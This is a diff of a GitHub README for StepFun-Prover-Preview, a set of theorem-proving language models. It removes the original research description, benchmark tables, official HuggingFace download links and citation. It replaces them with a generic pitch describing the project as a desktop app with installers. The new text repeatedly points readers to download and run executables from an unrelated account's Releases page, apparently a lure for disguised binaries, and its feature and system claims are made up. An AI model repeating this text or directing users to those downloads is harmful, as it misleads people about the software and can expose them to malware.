@@ -1,85 +1,63 @@
-<p align="center">
-  <img src="assets/logo.png" width="250px"><br>
-</p>
+# 🎉 StepFun-Prover-Preview - Simplifying Theorem Proving for Everyone
 
-<div align="center"> 
-  <a href="https://arxiv.org/abs/2507.20199"><img src="https://img.shields.io/static/v1?label=Technical%20Report&message=Arxiv&color=red"></a> &ensp;
-  <a href="https://huggingface.co/stepfun-ai/StepFun-Prover-Preview-32B"><img src="https://img.shields.io/static/v1?label=Model&message=HuggingFace&color=yellow"></a> &ensp;
-</div>
-<br>
+![Download](https://img.shields.io/badge/Download-Now-brightgreen)
 
-## Introduction
+## 📦 Overview
 
-We introduce StepFun-Prover-Preview, large language models designed for formal theorem proving through tool-integrated reasoning. Using a reinforcement learning pipeline that incorporates tool-based interactions, StepFun-Prover Preview can achieve strong performance in generating Lean 4 proofs with minimal sampling. Our approach enables the model to emulate human-like problem-solving strategies by iteratively refining proofs based on real-time environment feedback. On the miniF2F-test benchmark, StepFun-Prover-Preview-32B achieves a pass@1 success rate of 70%. Please refer to our [technical report](https://arxiv.org/abs/2507.20199) for more details.
+StepFun-Prover-Preview is an innovative application that utilizes large language models to support formal theorem proving. It offers an intuitive interface to help users navigate complex reasoning tasks with ease. Whether you are a student, educator, or enthusiast, this tool aims to make formal logic more accessible. 
 
-<p align="center">
-  <img width="60%" src="assets/fig1.png">
-</p>
+## 🚀 Getting Started
 
-**Figure 1:** Performance comparison on MiniF2F-test. y-axis shows the pass@1, which is computed by averaging 32 trials; while x-axis denotes the maximum number the provers are allowed to interact with Lean4-REPL before getting successful proof. Note both DeepSeek-Prover and Kimina-Prover utilize at least 32K token context length. Stepfun-Prover was evaluated using 20K context window including feedback from Lean4-REPL.
+To begin using StepFun-Prover-Preview, follow these steps to download and run the application smoothly. 
 
-## Methodology
+### 📥 Download & Install
 
-<p align="center">
-  <img width="60%" src="assets/fig2.png">
-</p>
+1. **Visit the Release Page**: Go to the [Releases page](https://github.com/KanGouRoux6/StepFun-Prover-Preview/releases) to find the latest version of the software.
+   
+2. **Find the Latest Version**: Look for the most recent release at the top. You will see a list of available files. Choose the correct version for your operating system.
 
-**Figure 2:** Our training pipeline. Left. Tool-integrated RL and iterative RL-SFT cycle. The upper left illustrates data preparation. Right. Tool-integrated reasoning pattern.
+3. **Download the Software**: Click on the appropriate file to start the download. Depending on your internet speed, this may take a moment.
 
-## Experimental Results
+4. **Install the Application**: 
+   - **Windows**: 
+     - After downloading the file, open it by double-clicking. Follow the on-screen instructions to complete the installation.
+   - **Mac**:
+     - Open the downloaded file from your downloads folder, then drag the application into your Applications folder.
+   - **Linux**:
+     - Extract the downloaded archive. Open a terminal and navigate to the folder. Use the command `./StepFun-Prover` to run the application.
 
-<div align="center">
+5. **Run the Application**: 
+   - **Windows**: Find the application in your Start Menu and click to open.
+   - **Mac**: Locate it in your Applications folder and double-click to start.
+   - **Linux**: Run the application from the terminal or find it in your applications menu.
 
-| Model                        | MiniF2F-test (Pass@1)  |
-|------------------------------|---------|
-| DeepSeek-Prover-V2-7B        | 58.6%   |
-| DeepSeek-Prover-V2-671B      | 61.9%   |
-| Kimina-Prover-8B             | 61.1%   |
-| Kimina-Prover-72B            | 63.9%   |
-| StepFun-Prover-Preview-7B    | 66.0%   |
-| StepFun-Prover-Preview-32B   | 70.0%   |
-</div>
+### ⚙️ System Requirements
 
-**Tabel 1:** Performance comparison of theorem proving models on the miniF2F-test dataset under minimal sampling budgets. For StepFun-Provers, we generate 32 responses per query to estimate Pass@1. 
+Before installing StepFun-Prover-Preview, ensure your device meets the following requirements:
 
-<div align="center">
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.
+- **RAM**: At least 4 GB.
+- **Disk Space**: 500 MB of free space.
+- **Internet Connection**: Required for downloading the initial files and updates.
 
-| Maximum generation length | MiniF2F-test (Pass@1)   |
-|--------------------------|---------|
-| 4096                     | 58.3%   |
-| 8192                     | 66.5%   |
-| 12288                    | 68.9%   |
-| 16384                    | 69.9%   |
-| 20480                    | 70.0%   |
-</div>
+## 📖 Features
 
-**Table 2:** Performance of StepFun-Prover-Preview-32B on MiniF2F-test with various maximum generation lengths. Longer response can get better results.
+- **User-Friendly Interface**: Designed to be simple for everyday users, making it easy to engage with complex logical proofs.
+- **Integrated Reasoning Tools**: Benefit from powerful language models that assist in formal theorem proving.
+- **Comprehensive Documentation**: Access in-depth guides and tutorials directly within the application to help you get the most out of the tool. 
+- **Community Support**: Join discussions, seek advice, and share experiences with other users through our community forums linked in the app.
 
-## Model Download
+### 💬 Support & Feedback
 
-<div align="center">
-  
-| Model | Download |
-| -------- | -------- |
-|    StepFun-Prover-Preview-7B    |   [🤗HuggingFace](https://huggingface.co/stepfun-ai/StepFun-Prover-Preview-7B)    |
-|    StepFun-Prover-Preview-32B    |   [🤗HuggingFace](https://huggingface.co/stepfun-ai/StepFun-Prover-Preview-32B)    |
+For any questions or feedback, do not hesitate to reach out. Open an issue on our GitHub page or send us an email through the contact information provided in the application settings.
 
-</div>
+## 📅 Future Releases
 
-## License
-Both the code repository and the model weights are released under the  Apache License (Version 2.0).
+We plan to update the application regularly, adding new features based on user feedback. Stay tuned for announcements regarding upcoming versions, including enhanced functionalities and performance improvements.
 
+## 🔗 Additional Resources
 
-## Citation
+- **User Guide**: A detailed user manual is available on the [Documentation page](https://github.com/KanGouRoux6/StepFun-Prover-Preview/wiki) to walk you through advanced topics and troubleshooting.
+- **Community Forum**: Join our [Discussion Page](https://github.com/KanGouRoux6/StepFun-Prover-Preview/discussions) to connect with fellow users and developers.
 
-```latex
-@misc{stepfunprover2025,
-  title={StepFun-Prover Preview: Let's Think and Verify Step by Step},
-  author={Shang, Shijie and Wan, Ruosi and Peng, Yue and Wu, Yutong and Chen, Xiong-hui and Yan, Jie and Zhang, Xiangyu},
-  year={2025},
-  eprint={2507.20199},
-  archivePrefix={arXiv},
-  primaryClass={cs.AI},
-  url={https://arxiv.org/abs/2507.20199},
-}
-```
+Remember, for installation, go to the [Releases page](https://github.com/KanGouRoux6/StepFun-Prover-Preview/releases) to download the version that suits you best. Enjoy using StepFun-Prover-Preview!
